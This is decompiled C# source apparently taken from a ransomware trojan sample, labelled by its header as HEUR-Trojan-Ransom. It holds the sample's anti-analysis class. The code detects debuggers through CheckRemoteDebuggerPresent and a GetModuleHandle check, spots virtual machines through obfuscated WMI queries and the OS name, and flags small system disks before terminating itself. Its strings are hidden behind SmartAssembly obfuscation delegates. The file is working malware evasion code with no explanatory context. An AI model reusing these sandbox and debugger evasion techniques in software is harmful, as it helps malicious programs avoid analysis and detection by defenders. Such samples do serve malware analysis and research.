// Decompiled with JetBrains decompiler
// Type: gtzdezosLTmcL.tEcQOpavaqPtY
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B8444C5B-FCC9-4B9F-A06C-7304BA49E3C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.Win32.Generic-1d4db8733c5f11ee8fca530aeb4a91069de04b1af64cbe1fa3ae2d3572a6e554.exe

using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;

namespace gtzdezosLTmcL
{
  internal sealed class tEcQOpavaqPtY
  {
    [NonSerialized]
    internal static GetString \u0098;

    public static void YJmTioZprpUqwl()
    {
      if (tEcQOpavaqPtY.CjCPlOdSTrnYaz() || tEcQOpavaqPtY.sHXwDXddBDlZYWk() || tEcQOpavaqPtY.lGgTJmUYcVhwO() || tEcQOpavaqPtY.bjuKsrSPuPl() || tEcQOpavaqPtY.vyJdRkAWpiW())
        Process.GetCurrentProcess().Kill();
      Environment.FailFast((string) null);
    }

    private static bool bjuKsrSPuPl()
    {
      try
      {
        long num = 61000000000;
        if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool vyJdRkAWpiW()
    {
      try
      {
        if (new ComputerInfo().OSFullName.ToLower().Contains(tEcQOpavaqPtY.\u0098(107371926)))
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool CjCPlOdSTrnYaz()
    {
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(tEcQOpavaqPtY.\u0098(107371921)))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              string lower = managementBaseObject[tEcQOpavaqPtY.\u0098(107371392)].ToString().ToLower();
              if (lower == tEcQOpavaqPtY.\u0098(107371343) && managementBaseObject[tEcQOpavaqPtY.\u0098(107371314)].ToString().ToUpperInvariant().Contains(tEcQOpavaqPtY.\u0098(107371337)) || lower.Contains(tEcQOpavaqPtY.\u0098(107371292)) || managementBaseObject[tEcQOpavaqPtY.\u0098(107371314)].ToString() == tEcQOpavaqPtY.\u0098(107371283))
                return true;
            }
          }
        }
      }
      catch
      {
      }
      return false;
    }

    private static bool sHXwDXddBDlZYWk()
    {
      bool flag = false;
      try
      {
        tEcQOpavaqPtY.BrpkkHbNmGEUtQI(Process.GetCurrentProcess().Handle, ref flag);
        return flag;
      }
      catch
      {
        return flag;
      }
    }

    private static bool lGgTJmUYcVhwO()
    {
      try
      {
        return tEcQOpavaqPtY.APpqAJaVFAgd(tEcQOpavaqPtY.\u0098(107371298)).ToInt32() != 0;
      }
      catch
      {
        return false;
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
    public static extern IntPtr APpqAJaVFAgd([In] string obj0);

    [DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", SetLastError = true)]
    private static extern bool BrpkkHbNmGEUtQI([In] IntPtr obj0, [In] ref bool obj1);

    static tEcQOpavaqPtY() => Strings.CreateGetStringDelegate(typeof (tEcQOpavaqPtY));
  }
}
